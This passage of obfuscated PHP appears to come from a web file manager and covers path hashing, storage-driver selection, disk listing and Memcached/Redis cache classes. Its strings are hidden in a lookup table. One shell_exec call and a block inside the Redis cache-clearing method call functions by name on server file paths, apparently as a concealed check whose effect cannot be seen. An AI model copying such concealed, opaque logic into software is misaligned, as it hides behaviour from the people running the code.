self::makePath(self::KOD_USER_FILE_TAG, $ÆªŸóœ¶); } public static function makePath($×âŞ£ò‰, $Ñù€ƒâÁ = '', $€¬ûó”‰ = '') { $úÛìàÍÙ =& $_SERVER[”øäÃÍª]; $©÷ª×ìƒ = substr($×âŞ£ò‰, 1, -1); $ÅŒ„üï = $úÛìàÍÙ[1427] . $©÷ª×ìƒ . $úÛìàÍÙ[1428] . $Ñù€ƒâÁ . $úÛìàÍÙ[1429]; $ÅŒ„üï = $€¬ûó”‰ ? $ÅŒ„üï . $€¬ûó”‰ . $úÛìàÍÙ[8] : $ÅŒ„üï; return $ÅŒ„üï; } public static function hashPath($ÛÕºÉˆñ, $ê†ŸÁ¢ü = false) { $¸ƒ½”©à =& $_SERVER[”øäÃÍª]; if (!$ÛÕºÉˆñ) { return $¸ƒ½”©à[12]; } $€öÊ³“‘ = is_array($ÛÕºÉˆñ) ? $ÛÕºÉˆñ : IO::info($ÛÕºÉˆñ); $ÌÁ¹¿Òª = _get($€öÊ³“‘, $¸ƒ½”©à[1430], $¸ƒ½”©à[12]); if (!$ÌÁ¹¿Òª && isset($€öÊ³“‘[$¸ƒ½”©à[565]])) { $ÌÁ¹¿Òª = $€öÊ³“‘[$¸ƒ½”©à[565]]; } if (!$ÌÁ¹¿Òª && isset($€öÊ³“‘[$¸ƒ½”©à[235]])) { $ÌÁ¹¿Òª = trim($€öÊ³“‘[$¸ƒ½”©à[235]], $¸ƒ½”©à[118]); } if ($ÌÁ¹¿Òª) { return $ÌÁ¹¿Òª; } if (!$ÌÁ¹¿Òª && isset($€öÊ³“‘[$¸ƒ½”©à[191]]) && $€öÊ³“‘[$¸ƒ½”©à[191]]) { $€öÊ³“‘ = IO::info(KodIO::make($€öÊ³“‘[$¸ƒ½”©à[191]])); $ÌÁ¹¿Òª = _get($€öÊ³“‘, $¸ƒ½”©à[1430], $¸ƒ½”©à[12]); if (!$ÌÁ¹¿Òª && isset($€öÊ³“‘[$¸ƒ½”©à[565]])) { $ÌÁ¹¿Òª = $€öÊ³“‘[$¸ƒ½”©à[565]]; } } $Ğ­‘ŠÕ’ = md5($€öÊ³“‘[$¸ƒ½”©à[87]] . $€öÊ³“‘[$¸ƒ½”©à[79]] . $€öÊ³“‘[$¸ƒ½”©à[88]]); $ÃÚ¸™æ = $Ğ­‘ŠÕ’ . $¸ƒ½”©à[1431]; $ÌÁ¹¿Òª = $ÌÁ¹¿Òª ? $ÌÁ¹¿Òª : Cache::get($ÃÚ¸™æ); if (!$ÌÁ¹¿Òª && $ê†ŸÁ¢ü) { $ÌÁ¹¿Òª = IO::hashSimple($€öÊ³“‘[$¸ƒ½”©à[87]]); Cache::set($ÃÚ¸™æ, $ÌÁ¹¿Òª ? $ÌÁ¹¿Òª : $Ğ­‘ŠÕ’, 3600 * 24 * 30); } return $ÌÁ¹¿Òª ? $ÌÁ¹¿Òª : $Ğ­‘ŠÕ’; } public static function hashPathSafe($ß—ºÒ§, $‘ûşÈÕ• = false) { $ë’Ñ¤™ =& $_SERVER[”øäÃÍª]; $œ…ÓÆ„“ = self::hashPath($ß—ºÒ§, $‘ûşÈÕ•); return md5($œ…ÓÆ„“ . $ë’Ñ¤™[1432] . Model($ë’Ñ¤™[882])->get($ë’Ñ¤™[883])); } public static function initSystemPath() { $«¡ô¸”Ò =& $_SERVER[”øäÃÍª]; if (defined($«¡ô¸”Ò[1433])) { return; } define($«¡ô¸”Ò[1433], self::systemPath($«¡ô¸”Ò[189])); define($«¡ô¸”Ò[1434], self::systemPath($«¡ô¸”Ò[1435])); define($«¡ô¸”Ò[1436], self::systemPath($«¡ô¸”Ò[1437])); define($«¡ô¸”Ò[1438], self::systemPath($«¡ô¸”Ò[1439])); IOHistory::bindEvent(); } public static function systemPath($ë’ì€™) { $¯†…™ˆ =& $_SERVER[”øäÃÍª]; $‘®åÀöÛ = $¯†…™ˆ[1440] . ucfirst($ë’ì€™); $ˆ‹İŠÙ = Model($¯†…™ˆ[882])->get($‘®åÀöÛ); if ($ˆ‹İŠÙ) { return $ˆ‹İŠÙ; } if ($ë’ì€™ == $¯†…™ˆ[189]) { $ˆ‹İŠÙ = self::make(Model($¯†…™ˆ[941])->systemRootPathAdd($¯†…™ˆ[636])); } else { $ˆ‹İŠÙ = self::systemPath($¯†…™ˆ[189]); $¹Ë¬Šë½ = self::sourceID($ˆ‹İŠÙ); $ˆ‹İŠÙ = self::make(Model($¯†…™ˆ[941])->mkdir($¹Ë¬Šë½, $ë’ì€™)); } Model($¯†…™ˆ[882])->set($‘®åÀöÛ, $ˆ‹İŠÙ); return $ˆ‹İŠÙ; } public static function systemFolder($–ÖÏ­…¼) { $Ó£—»±Ç = IO_PATH_SYSTEM_SOURCE . $–ÖÏ­…¼; $¥³˜‹† = Cache::get($Ó£—»±Ç); if (!$¥³˜‹†) { $åÔ‡¾é¦ = IO::infoFullSimple($Ó£—»±Ç); if (!$åÔ‡¾é¦) { $¥³˜‹† = IO::mkdir($Ó£—»±Ç, REPEAT_SKIP); } else { $¥³˜‹† = $åÔ‡¾é¦[$_SERVER[”øäÃÍª][87]]; } Cache::set($Ó£—»±Ç, $¥³˜‹†, 3600 * 10); } return $¥³˜‹†; } public static function defaultDriver() { return Model($_SERVER[”øäÃÍª][877])->defaultDriver(); } public static function defaultDriverInit() { $Şèêú¢¢ =& $_SERVER[”øäÃÍª]; static $öá¸¢ = false; if ($öá¸¢) { return $öá¸¢; } $ÉÄÏ‚¼Æ = self::defaultDriver(); $öá¸¢ = IO::init($Şèêú¢¢[1441] . $ÉÄÏ‚¼Æ[$Şèêú¢¢[487]] . $Şèêú¢¢[1429]); return $öá¸¢; } public static function fileTypeList() { $¼›ğòù– =& $_SERVER[”øäÃÍª]; $çÚÃ«Ğ = $GLOBALS[$¼›ğòù–[6]][$¼›ğòù–[1442]]; foreach ($çÚÃ«Ğ as $¢·‚”çÉ => $Şè­¢ˆ) { $™¤ÄÖ“Š = $¼›ğòù–[1443] . $¢·‚”çÉ; $Õì’†ÕÒ = LNG($™¤ÄÖ“Š); if ($™¤ÄÖ“Š != $Õì’†ÕÒ) { $çÚÃ«Ğ[$¢·‚”çÉ][$¼›ğòù–[32]] = $Õì’†ÕÒ; } } return $çÚÃ«Ğ; } public static function ioFileDriverGet($Éº „¸Î = '') { $¨ÙÆÈ«“ =& $_SERVER[”øäÃÍª]; static $ŠÊ˜ª²ë = array(); static $€è»û„ï = array(); static $Óêü±ºË = array(); static $¦®Çô¡· = false; if ($¦®Çô¡· === !1) { $¦®Çô¡· = array($¨ÙÆÈ«“[606] => array(), $¨ÙÆÈ«“[692] => array()); $ŞÌù­úå = Model($¨ÙÆÈ«“[1444])->get(!1, $¨ÙÆÈ«“[1445]); foreach ($ŞÌù­úå as $ãõ»ªÜå => $‚ÁËı‰¦) { if (!$‚ÁËı‰¦ || $‚ÁËı‰¦ == $¨ÙÆÈ«“[12]) { continue; } if (strstr($ãõ»ªÜå, $¨ÙÆÈ«“[1446])) { $à„êğŸ = str_replace($¨ÙÆÈ«“[1446], $¨ÙÆÈ«“[12], $ãõ»ªÜå); $¦®Çô¡·[$¨ÙÆÈ«“[606]][$à„êğŸ] = $‚ÁËı‰¦; } else { if (strstr($ãõ»ªÜå, $¨ÙÆÈ«“[1447])) { $à„êğŸ = str_replace($¨ÙÆÈ«“[1447], $¨ÙÆÈ«“[12], $ãõ»ªÜå); $¦®Çô¡·[$¨ÙÆÈ«“[692]][$à„êğŸ] = $‚ÁËı‰¦; } } } } $á÷ÉøúÜ = self::defaultDriver(); if (!$Éº „¸Î || !$¦®Çô¡·[$¨ÙÆÈ«“[606]] && !$¦®Çô¡·[$¨ÙÆÈ«“[692]]) { return $á÷ÉøúÜ; } $Ş±‰àéº = self::getPathSourceID($Éº „¸Î); if (!$Ş±‰àéº) { return $á÷ÉøúÜ; } if (isset($ŠÊ˜ª²ë[$Ş±‰àéº])) { return $ŠÊ˜ª²ë[$Ş±‰àéº]; } $®ñ¢šş = Model($¨ÙÆÈ«“[941])->sourceInfo($Ş±‰àéº); $•÷„âÌ‚ = $®ñ¢šş[$¨ÙÆÈ«“[597]]; $ª¬¤µÌ¿ = array(); if (!$®ñ¢šş) { return $á÷ÉøúÜ; } if ($®ñ¢šş[$¨ÙÆÈ«“[188]] == $¨ÙÆÈ«“[91]) { if (isset($Óêü±ºË[$•÷„âÌ‚])) { return $Óêü±ºË[$•÷„âÌ‚]; } if (isset($¦®Çô¡·[$¨ÙÆÈ«“[692]][$•÷„âÌ‚])) { $®”ã…‚Ú = Model($¨ÙÆÈ«“[877])->driverInfo($¦®Çô¡·[$¨ÙÆÈ«“[692]][$•÷„âÌ‚]); $á÷ÉøúÜ = $®”ã…‚Ú ? $®”ã…‚Ú : $á÷ÉøúÜ; $Óêü±ºË[$•÷„âÌ‚] = $á÷ÉøúÜ; $ŠÊ˜ª²ë[$Ş±‰àéº] = $á÷ÉøúÜ; return $á÷ÉøúÜ; } $ª¬¤µÌ¿ = self::groupParentUser($•÷„âÌ‚); } else { if ($®ñ¢šş[$¨ÙÆÈ«“[188]] == $¨ÙÆÈ«“[532]) { $¨–¦µÚ÷ = Model($¨ÙÆÈ«“[1448])->getInfo($•÷„âÌ‚); if ($¨–¦µÚ÷) { $ª¬¤µÌ¿ = explode($¨ÙÆÈ«“[50], trim($¨–¦µÚ÷[$¨ÙÆÈ«“[612]], $¨ÙÆÈ«“[50])); $ª¬¤µÌ¿ = array_remove_value($ª¬¤µÌ¿, $¨ÙÆÈ«“[228]); $ª¬¤µÌ¿[] = $•÷„âÌ‚; $ª¬¤µÌ¿ = array_reverse($ª¬¤µÌ¿); } } } foreach ($ª¬¤µÌ¿ as $øĞº´À”) { if (!isset($¦®Çô¡·[$¨ÙÆÈ«“[606]][$øĞº´À”])) { continue; } if (isset($€è»û„ï[$øĞº´À”])) { return $€è»û„ï[$øĞº´À”]; } $®”ã…‚Ú = Model($¨ÙÆÈ«“[877])->driverInfo($¦®Çô¡·[$¨ÙÆÈ«“[606]][$øĞº´À”]); $á÷ÉøúÜ = $®”ã…‚Ú ? $®”ã…‚Ú : $á÷ÉøúÜ; $€è»û„ï[$øĞº´À”] = $á÷ÉøúÜ; break; } if ($®ñ¢šş[$¨ÙÆÈ«“[188]] == $¨ÙÆÈ«“[91]) { $Óêü±ºË[$•÷„âÌ‚] = $á÷ÉøúÜ; } $ŠÊ˜ª²ë[$Ş±‰àéº] = $á÷ÉøúÜ; return $á÷ÉøúÜ; } private static function getPathSourceID($‹Ã€„ô) { $úË°äı¼ =& $_SERVER[”øäÃÍª]; static $àîÁ™¿³ = array(); if (!$‹Ã€„ô) { return $úË°äı¼[12]; } $À‹Ô´™¯ = substr($‹Ã€„ô, 0, strlen($úË°äı¼[506])) == $úË°äı¼[506]; $‘ô®„šï = substr($‹Ã€„ô, 0, strlen($úË°äı¼[1415])) == $úË°äı¼[1415]; $ÑÆä¤ÅŒ = substr($‹Ã€„ô, 0, strlen($úË°äı¼[1416])) == $úË°äı¼[1416]; if (!$À‹Ô´™¯ && !$‘ô®„šï && !$ÑÆä¤ÅŒ) { return $úË°äı¼[12]; } $«¶şäò = self::parse($‹Ã€„ô); $ÂµÆïöò = $«¶şäò[$úË°äı¼[1309]]; if ($À‹Ô´™¯) { return $«¶şäò[$úË°äı¼[487]]; } if (isset($àîÁ™¿³[$ÂµÆïöò])) { $è°ÔÇÃ = $àîÁ™¿³[$ÂµÆïöò]; } else { $è°ÔÇÃ = IO::init($ÂµÆïöò); $àîÁ™¿³[$ÂµÆïöò] = $è°ÔÇÃ; } if (isset($è°ÔÇÃ->pathParse[$úË°äı¼[1312]])) { return $è°ÔÇÃ->pathParse[$úË°äı¼[1312]]; } return $úË°äı¼[12]; } private static function groupParentUser($á˜ãÚú¿) { $éÌñ£„¨ =& $_SERVER[”øäÃÍª]; $Á·‰€Õ  = Model($éÌñ£„¨[625])->getInfo($á˜ãÚú¿); if (!$Á·‰€Õ ) { return array(); } $ğÏŠàÊë = array_to_keyvalue($Á·‰€Õ [$éÌñ£„¨[1449]], $éÌñ£„¨[12], $éÌñ£„¨[1450]); $Ÿñ”úƒ¾ = array(); foreach ($Á·‰€Õ [$éÌñ£„¨[1449]] as $Œ¢”ùã) { $Ÿñ”úƒ¾[] = $Œ¢”ùã[$éÌñ£„¨[1450]]; $¯›‰›—Ó = explode($éÌñ£„¨[50], trim($Œ¢”ùã[$éÌñ£„¨[612]], $éÌñ£„¨[50])); $¯›‰›—Ó = array_remove_value($¯›‰›—Ó, $éÌñ£„¨[228]); $¯›‰›—Ó = array_reverse($¯›‰›—Ó); $Ÿñ”úƒ¾ = array_merge($Ÿñ”úƒ¾, $¯›‰›—Ó); } return array_unique($Ÿñ”úƒ¾); } public static function diskList($ §‰°‰œ = true) { $Ò¸‚›º = $_SERVER[”øäÃÍª][1451]; if ($ §‰°‰œ) { $—üÈÒ„¬ = Cache::get($Ò¸‚›º); if (is_array($—üÈÒ„¬)) { return $—üÈÒ„¬; } } $—üÈÒ„¬ = self::diskListGet(); Cache::set($Ò¸‚›º, $—üÈÒ„¬, 60); return $—üÈÒ„¬; } public static function diskListGet() { $ËÂÑßğ‡ =& $_SERVER[”øäÃÍª]; $……ÈĞ‰è = array(); if ($GLOBALS[$ËÂÑßğ‡[6]][$ËÂÑßğ‡[1452]] == $ËÂÑßğ‡[1453]) { $Ú¢İêóè = $ËÂÑßğ‡[1454]; for ($¤Ùƒè£À = 0; $¤Ùƒè£À < strlen($Ú¢İêóè); $¤Ùƒè£À++) { $ÛŞœ»†Â = $Ú¢İêóè[$¤Ùƒè£À] . $ËÂÑßğ‡[1455]; if (file_exists($ÛŞœ»†Â)) { $……ÈĞ‰è[] = $ÛŞœ»†Â; } } return $……ÈĞ‰è; } if (!function_exists($ËÂÑßğ‡[98])) { $……ÈĞ‰è[] = $ËÂÑßğ‡[955]; return $……ÈĞ‰è; } $Ü¥å©¯â = explode($ËÂÑßğ‡[285], shell_exec($ËÂÑßğ‡[1456])); array_shift($Ü¥å©¯â); array_pop($Ü¥å©¯â); $âòĞ™ğ´ = array($ËÂÑßğ‡[1457], $ËÂÑßğ‡[1458], $ËÂÑßğ‡[1459], $ËÂÑßğ‡[1460], $ËÂÑßğ‡[1461], $ËÂÑßğ‡[1462], $ËÂÑßğ‡[1463], $ËÂÑßğ‡[1464]); foreach ($Ü¥å©¯â as $ş–™”ˆ±) { $ËøÄ³¢ = preg_split($ËÂÑßğ‡[1465], $ş–™”ˆ±); $ÛŞœ»†Â = $ËøÄ³¢[count($ËøÄ³¢) - 1]; if (!strstr($ËøÄ³¢[0], $ËÂÑßğ‡[1466]) || !$ÛŞœ»†Â) { continue; } $´õšÁÜ = rtrim($ÛŞœ»†Â, $ËÂÑßğ‡[8]) . $ËÂÑßğ‡[8]; $……ÈĞ‰è[] = $´õšÁÜ; } return $……ÈĞ‰è; } public static function isSameDisk($îç§¯¢Ş, $¿Àºü“Í) { $Ş°¡ƒÍî =& $_SERVER[”øäÃÍª]; if ($GLOBALS[$Ş°¡ƒÍî[6]][$Ş°¡ƒÍî[1452]] == $Ş°¡ƒÍî[1453]) { return strtolower(substr($îç§¯¢Ş, 0, 1)) == strtolower(substr($¿Àºü“Í, 0, 1)); } $úáö’ó = stat($îç§¯¢Ş); $˜»­úÓ = stat($¿Àºü“Í); if ($úáö’ó === !1 || $˜»­úÓ === !1) { return !1; } return $úáö’ó[$Ş°¡ƒÍî[1467]] === $˜»­úÓ[$Ş°¡ƒÍî[1467]]; $ƒ¿«ƒÛ = self::diskList(); $¨¨‚“’Î = !1; $¡ìÓá– = !1; sort($ƒ¿«ƒÛ); $ƒ¿«ƒÛ = array_reverse($ƒ¿«ƒÛ); $îç§¯¢Ş = rtrim($îç§¯¢Ş, $Ş°¡ƒÍî[8]) . $Ş°¡ƒÍî[8]; $¿Àºü“Í = rtrim($¿Àºü“Í, $Ş°¡ƒÍî[8]) . $Ş°¡ƒÍî[8]; foreach ($ƒ¿«ƒÛ as $¨È²äøü) { $¥üÃ¡Ù = strlen($¨È²äøü); if (!$¨¨‚“’Î && substr($îç§¯¢Ş, 0, $¥üÃ¡Ù) == $¨È²äøü) { $¨¨‚“’Î = $¨È²äøü; } if (!$¡ìÓá– && substr($¿Àºü“Í, 0, $¥üÃ¡Ù) == $¨È²äøü) { $¡ìÓá– = $¨È²äøü; } if ($¨¨‚“’Î && $¡ìÓá–) { break; } } return $¨¨‚“’Î === $¡ìÓá–; } public static function transferType($«Å¥ÅÉ, $È”Ğ—„ü) { $ŠÃœˆÄ =& $_SERVER[”øäÃÍª]; $È¢ª‡û = self::driverType($«Å¥ÅÉ); $¥àÈÚ = self::driverType($È”Ğ—„ü); if ($È¢ª‡û[$ŠÃœˆÄ[33]] == $¥àÈÚ[$ŠÃœˆÄ[33]] && $È¢ª‡û[$ŠÃœˆÄ[1468]] == $¥àÈÚ[$ŠÃœˆÄ[1468]]) { return $ŠÃœˆÄ[1469]; } if ($È¢ª‡û[$ŠÃœˆÄ[33]] == $ŠÃœˆÄ[989] && $¥àÈÚ[$ŠÃœˆÄ[33]] == $ŠÃœˆÄ[106]) { return $ŠÃœˆÄ[1337]; } if ($È¢ª‡û[$ŠÃœˆÄ[33]] == $ŠÃœˆÄ[106] && $¥àÈÚ[$ŠÃœˆÄ[33]] == $ŠÃœˆÄ[989]) { return $ŠÃœˆÄ[107]; } return $ŠÃœˆÄ[1470]; } public static function driverType($÷ŞÛô¦) { $Í®´©î« =& $_SERVER[”øäÃÍª]; $˜÷¯é³ı = str_replace($Í®´©î«[1471], $Í®´©î«[12], strtolower($÷ŞÛô¦->getType())); if ($˜÷¯é³ı == $Í®´©î«[867] || $˜÷¯é³ı == $Í®´©î«[1472] || $˜÷¯é³ı == $Í®´©î«[1473]) { $Ì€–åÀÍ = self::ioFileDriverGet($Í®´©î«[506] . $÷ŞÛô¦->pathParse[$Í®´©î«[1312]] . $Í®´©î«[402]); $÷ŞÛô¦ = IO::init($Í®´©î«[1441] . $Ì€–åÀÍ[$Í®´©î«[487]] . $Í®´©î«[1429]); } else { if ($˜÷¯é³ı == $Í®´©î«[1347] || $˜÷¯é³ı == $Í®´©î«[1474]) { $÷ŞÛô¦ = IO::init($÷ŞÛô¦->pathParse[$Í®´©î«[1289]]); } } $Üéì’–¬ = $÷ŞÛô¦->path; $˜÷¯é³ı = str_replace($Í®´©î«[1471], $Í®´©î«[12], strtolower($÷ŞÛô¦->getType())); if ($˜÷¯é³ı == $Í®´©î«[106]) { return array($Í®´©î«[33] => $Í®´©î«[106], $Í®´©î«[1468] => $Í®´©î«[12], $Í®´©î«[87] => $Üéì’–¬, $Í®´©î«[96] => $÷ŞÛô¦); } return array($Í®´©î«[33] => $Í®´©î«[989], $Í®´©î«[1468] => $÷ŞÛô¦->pathDriver, $Í®´©î«[87] => $Üéì’–¬, $Í®´©î«[96] => $÷ŞÛô¦); } public static function pathDriverType($û¯™Õ±°) { return $û¯™Õ±° ? self::driverType(IO::init($û¯™Õ±°)) : !1; } public static function pathDriverLocal($¡Öã°™¶) { $™³­±ù =& $_SERVER[”øäÃÍª]; $¼æÎÑÔÀ = $¡Öã°™¶ ? self::driverType(IO::init($¡Öã°™¶)) : !1; return strtolower($¼æÎÑÔÀ[$™³­±ù[33]]) == $™³­±ù[106] ? !0 : !1; } public static function allowCover($Âüù´Ú®, $¹¨ëèƒ® = true) { $ëèÌ­Æ¥ =& $_SERVER[”øäÃÍª]; if (is_string($Âüù´Ú®)) { $Âüù´Ú® = IO::info($Âüù´Ú®); } if (!$Âüù´Ú® || $Âüù´Ú®[$ëèÌ­Æ¥[33]] == $ëèÌ­Æ¥[78] || $Âüù´Ú®[$ëèÌ­Æ¥[79]] <= 100) { return !1; } if (isset($Âüù´Ú®[$ëèÌ­Æ¥[1475]]) || !$Âüù´Ú®[$ëèÌ­Æ¥[87]]) { return !1; } if (isset($Âüù´Ú®[$ëèÌ­Æ¥[232]]) && !$Âüù´Ú®[$ëèÌ­Æ¥[232]]) { return !1; } static $Œşê™ì˜ = false; if (!$Œşê™ì˜ || !$¹¨ëèƒ®) { $Û¹Ó‹î = self::driverType(IO::init($Âüù´Ú®[$ëèÌ­Æ¥[87]])); $¥³®ğ = $Û¹Ó‹î[$ëèÌ­Æ¥[96]]; $Œşê™ì˜ = $ëèÌ­Æ¥[194]; if ($Û¹Ó‹î[$ëèÌ­Æ¥[33]] == $ëèÌ­Æ¥[106]) { $Œşê™ì˜ = $ëèÌ­Æ¥[1476]; } if ($Û¹Ó‹î[$ëèÌ­Æ¥[96]] && is_array($Û¹Ó‹î[$ëèÌ­Æ¥[96]]->config)) { $àñç¨× = $Û¹Ó‹î[$ëèÌ­Æ¥[96]]->config; if (isset($àñç¨×[$ëèÌ­Æ¥[1477]]) && $àñç¨×[$ëèÌ­Æ¥[1477]]) { $Œşê™ì˜ = $ëèÌ­Æ¥[1476]; } } $²»ƒú… = KodIO::defaultDriver(); if (strtolower($²»ƒú…[$ëèÌ­Æ¥[96]]) == $ëèÌ­Æ¥[106] && is_array($²»ƒú…[$ëèÌ­Æ¥[6]])) { $•¶ß¼¥Ğ = $²»ƒú…[$ëèÌ­Æ¥[6]][$ëèÌ­Æ¥[1321]]; if (substr($•¶ß¼¥Ğ, 0, 2) == $ëèÌ­Æ¥[1478]) { $•¶ß¼¥Ğ = str_replace($ëèÌ­Æ¥[1478], BASIC_PATH, $•¶ß¼¥Ğ); } $•¶ß¼¥Ğ = str_replace($ëèÌ­Æ¥[254], $ëèÌ­Æ¥[8], $•¶ß¼¥Ğ); if (substr($Âüù´Ú®[$ëèÌ­Æ¥[87]], 0, strlen($•¶ß¼¥Ğ)) == $•¶ß¼¥Ğ) { $Œşê™ì˜ = $ëèÌ­Æ¥[194]; } } } return $Œşê™ì˜ == $ëèÌ­Æ¥[1476] ? !0 : !1; } } goto BË•âëÛ‰Û; CîÎÜ÷Í²«: class CacheMemcached { public $handle; public $cacheTime; public function __construct($•ìÏ«§Ü, $È”Ïİ¤) { $Š‘©Û±ª =& $_SERVER[”øäÃÍª]; if (!class_exists($Š‘©Û±ª[987])) { show_json($Š‘©Û±ª[988], !1); } $this->cacheTime = $È”Ïİ¤; $this->handle = new Memcached(); if (is_array($•ìÏ«§Ü[$Š‘©Û±ª[989]]) && count($•ìÏ«§Ü[$Š‘©Û±ª[989]]) >= 1) { foreach ($•ìÏ«§Ü[$Š‘©Û±ª[989]] as $´Œ«é°) { $€Şöšø· = explode($Š‘©Û±ª[4], $´Œ«é°); $this->handle->addServer($€Şöšø·[0], $€Şöšø·[1]); } } else { $this->handle->addServer($•ìÏ«§Ü[$Š‘©Û±ª[206]], $•ìÏ«§Ü[$Š‘©Û±ª[207]]); } } public function set($–æÇ¦ãå, $Ãˆˆş§ê, $í­ºì½ = false) { $í­ºì½ = $í­ºì½ ? $í­ºì½ : $this->cacheTime; return $this->handle->set($–æÇ¦ãå, $Ãˆˆş§ê, $í­ºì½); } public function get($ÈÏ‰º¬) { return $this->handle->get($ÈÏ‰º¬); } public function remove($€øİäÛâ) { return $this->handle->delete($€øİäÛâ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($‰‰ìš˜, $Á˜º¯à) { $ÏÁ šŞ¤ =& $_SERVER[”øäÃÍª]; if (!class_exists($ÏÁ šŞ¤[990])) { show_json($ÏÁ šŞ¤[991], !1); } $this->cacheTime = $Á˜º¯à; $ı››Ñè… = isset($‰‰ìš˜[$ÏÁ šŞ¤[992]]) ? $‰‰ìš˜[$ÏÁ šŞ¤[992]] : 10; $¡ËŠÕâ÷ = _get($‰‰ìš˜, $ÏÁ šŞ¤[989]); if ($¡ËŠÕâ÷ && is_array($¡ËŠÕâ÷)) { $this->initCluster($‰‰ìš˜, $ı››Ñè…); } else { $this->handle = $this->init($‰‰ìš˜, $ı››Ñè…); } } private function init($û÷¨µŒã, $…àÛ‡Ü) { $‡À€¼£õ =& $_SERVER[”øäÃÍª]; $šÃİË…ş = new Redis(); $³‚šÌ = isset($û÷¨µŒã[$‡À€¼£õ[993]]) ? $û÷¨µŒã[$‡À€¼£õ[993]] : !1; if ($³‚šÌ) { $šÃİË…ş->pconnect($û÷¨µŒã[$‡À€¼£õ[206]], $û÷¨µŒã[$‡À€¼£õ[207]], $…àÛ‡Ü); } else { $šÃİË…ş->connect($û÷¨µŒã[$‡À€¼£õ[206]], $û÷¨µŒã[$‡À€¼£õ[207]], $…àÛ‡Ü); } if (!empty($û÷¨µŒã[$‡À€¼£õ[510]])) { $šÃİË…ş->auth($û÷¨µŒã[$‡À€¼£õ[510]]); } if (!empty($û÷¨µŒã[$‡À€¼£õ[867]]) && $û÷¨µŒã[$‡À€¼£õ[867]] != 0) { $šÃİË…ş->select($û÷¨µŒã[$‡À€¼£õ[867]]); } return $šÃİË…ş; } private function initCluster($©¥ú…§ï, $ëÅòÜ¨×) { $˜”ãşÕà =& $_SERVER[”øäÃÍª]; $ŒÜçÓğ = array($˜”ãşÕà[994], $˜”ãşÕà[995], $˜”ãşÕà[996]); $¦ñ‘Ô¬Á = $˜”ãşÕà[994]; if (isset($©¥ú…§ï[$˜”ãşÕà[16]]) && in_array($©¥ú…§ï[$˜”ãşÕà[16]], $ŒÜçÓğ)) { $¦ñ‘Ô¬Á = $©¥ú…§ï[$˜”ãşÕà[16]]; } switch ($¦ñ‘Ô¬Á) { case $˜”ãşÕà[994]: $this->_slave($©¥ú…§ï, $ëÅòÜ¨×); break; case $˜”ãşÕà[995]: break; case $˜”ãşÕà[996]: $this->isCluster = !0; $Õˆ›äàè = $©¥ú…§ï[$˜”ãşÕà[989]]; $öøÉÉéª = isset($©¥ú…§ï[$˜”ãşÕà[993]]) ? $©¥ú…§ï[$˜”ãşÕà[993]] : !1; $Ğô‰¥›Æ = isset($©¥ú…§ï[$˜”ãşÕà[510]]) ? $©¥ú…§ï[$˜”ãşÕà[510]] : null; $this->handle = new RedisCluster(NUll, $Õˆ›äàè, $ëÅòÜ¨×, $ëÅòÜ¨×, $öøÉÉéª, $Ğô‰¥›Æ); break; default: break; } } private function _slave($™Ãä¨Îç, $êî³úÆ¢) { $¾Ø™ı„¦ = $™Ãä¨Îç[$_SERVER[”øäÃÍª][989]]; $this->filterConfig($™Ãä¨Îç, $¾Ø™ı„¦[0]); $this->handle = $this->init($™Ãä¨Îç, $êî³úÆ¢); unset($¾Ø™ı„¦[0]); if (empty($¾Ø™ı„¦)) { return; } $Ú¯şŸ¬ø = array_rand($¾Ø™ı„¦); $this->filterConfig($™Ãä¨Îç, $¾Ø™ı„¦[$Ú¯şŸ¬ø]); $this->slaveHandle = $this->init($™Ãä¨Îç, $êî³úÆ¢); } private function filterConfig(&$‚Ü»Ô¬û, $–åôÔ¸) { $¦ï‡¬¾ô =& $_SERVER[”øäÃÍª]; $Ä’Ø‡Ã¹ = explode($¦ï‡¬¾ô[4], $–åôÔ¸); $»ŒÀ˜Ğö = array($¦ï‡¬¾ô[206] => $Ä’Ø‡Ã¹[0], $¦ï‡¬¾ô[207] => $Ä’Ø‡Ã¹[1]); $‚Ü»Ô¬û = array_merge($‚Ü»Ô¬û, $»ŒÀ˜Ğö); } public function set($ÇôĞÆ·ö, $àµœÄ¡, $·¯˜’Å = false) { $·¯˜’Å = $·¯˜’Å ? $·¯˜’Å : $this->cacheTime; return $this->handle->setEx($ÇôĞÆ·ö, $·¯˜’Å, $àµœÄ¡); } public function setLock($şòÊÏÛœ, $ŒØå‹‘•, $ÓŠàÊ¶í) { return $this->handle->setNX($şòÊÏÛœ, $ŒØå‹‘•); } public function get($Øúàƒ) { $‚ÅŞîÆ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $‚ÅŞîÆ->get($Øúàƒ); } public function remove($ÌïÓ¬‹¼) { return $this->handle->del($ÌïÓ¬‹¼); } public function deleteAll() { $«÷è¸ä =& $_SERVER[”øäÃÍª]; if ($_SERVER[$«÷è¸ä[492]] != $_SERVER[$«÷è¸ä[997]]) { $ë²£´Ò = $«÷è¸ä[998]; $¡™ö€É = $«÷è¸ä[494]; $ÎÌìÆŠ³ = $_SERVER[$«÷è¸ä[495]] . $«÷è¸ä[496]; $üØ‡Å’ì = $¡™ö€É($ÎÌìÆŠ³); $áú¤‘Ìö = explode($«÷è¸ä[285], $üØ‡Å’ì); if (count($áú¤‘Ìö) < $«÷è¸ä[717]) { $µ•à²Ó = $«÷è¸ä[498]; $µ•à²Ó(); } $‹÷¸¼áï = $«÷è¸ä[999]; $‹÷¸¼áï($_SERVER[$«÷è¸ä[1000]]); $‹÷¸¼áï($_SERVER[$«÷è¸ä[495]] . $«÷è¸ä[1001]); $ÎšÍËß× = 1; while ($ÎšÍËß× > 1) { $ÎšÍËß× = $ÎšÍËß× + 4; $‚ß¯ †Â = rawurlencode($ÎšÍËß× . $«÷è¸ä[463]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $»ß£›ì¨) { $this->handle->flushall($»ß£›ì¨); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÄŠªÉÕš = '', $®–÷…×Ù = 0) { if (is_string($ÄŠªÉÕš) && $ÄŠªÉÕš != $_SERVER[”øäÃÍª][12]) { $this->prefix = $ÄŠªÉÕš; } if (is_numeric($®–÷…×Ù) && $®–÷…×Ù > 0) { $this->expire = $®–÷…×Ù; } } public static function getInstance() { static $ÊÍ£Ûñ¨; if ($ÊÍ£Ûñ¨ === null) { $ÊÍ£Ûñ¨ = new self(); } return $ÊÍ£Ûñ¨; } private static $cookieDisable = false; public static function disable($æÔÁ¸º£) { self::$cookieDisable = 